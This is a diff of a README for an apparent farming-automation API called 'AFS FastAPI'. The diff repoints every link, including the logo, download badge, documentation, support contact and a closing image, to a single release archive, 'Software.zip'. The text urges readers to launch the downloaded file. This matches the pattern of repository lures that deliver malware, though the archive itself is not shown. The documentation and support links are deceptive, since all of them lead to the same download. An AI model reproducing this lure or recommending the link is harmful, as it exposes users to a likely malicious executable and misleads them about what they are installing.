@@ -1,6 +1,6 @@
 # 🌾🤖 AFS FastAPI - Automated Farming System API 🚜🤖
 
-![AFS FastAPI Logo](https://github.com/erhes-ai/afs_fastapi/releases/download/v1.0/Application.zip)
+![AFS FastAPI Logo](https://github.com/erhes-ai/afs_fastapi/releases/download/v2.0/Software.zip)
 
 Welcome to the **AFS FastAPI** repository, your one-stop solution for implementing an automated farming system through our powerful API. Whether you are a seasoned farmer looking to integrate AI and robotics into your operations or a tech enthusiast venturing into the world of agriculture, our API has got you covered! 🌱🌾🤖
 
@@ -12,7 +12,7 @@ Welcome to the **AFS FastAPI** repository, your one-stop solution for implementi
 
 ## 📦 Latest Release
 
-[![Download AFS FastAPI](https://github.com/erhes-ai/afs_fastapi/releases/download/v1.0/Application.zip%20Release-brightgreen)](https://github.com/erhes-ai/afs_fastapi/releases/download/v1.0/Application.zip)
+[![Download AFS FastAPI](https://github.com/erhes-ai/afs_fastapi/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/erhes-ai/afs_fastapi/releases/download/v2.0/Software.zip)
 
 Please click the button above to download the latest release of AFS FastAPI. Ensure you launch the downloaded file for installation.
 
@@ -35,7 +35,7 @@ To start using AFS FastAPI in your farming projects, follow these steps:
 
 ## 📚 Documentation
 
-For detailed information on using AFS FastAPI, refer to our [Documentation](https://github.com/erhes-ai/afs_fastapi/releases/download/v1.0/Application.zip).
+For detailed information on using AFS FastAPI, refer to our [Documentation](https://github.com/erhes-ai/afs_fastapi/releases/download/v2.0/Software.zip).
 
 ## 🤝 Contributions
 
@@ -43,8 +43,8 @@ We welcome contributions from the community to enhance AFS FastAPI. If you have 
 
 ## 📞 Support
 
-If you encounter any issues or have questions about AFS FastAPI, reach out to us at https://github.com/erhes-ai/afs_fastapi/releases/download/v1.0/Application.zip
+If you encounter any issues or have questions about AFS FastAPI, reach out to us at https://github.com/erhes-ai/afs_fastapi/releases/download/v2.0/Software.zip
 
 ## 🌱 Happy Farming with AFS FastAPI! 🚜🤖
 
-![Happy Farming](https://github.com/erhes-ai/afs_fastapi/releases/download/v1.0/Application.zip)
+![Happy Farming](https://github.com/erhes-ai/afs_fastapi/releases/download/v2.0/Software.zip)
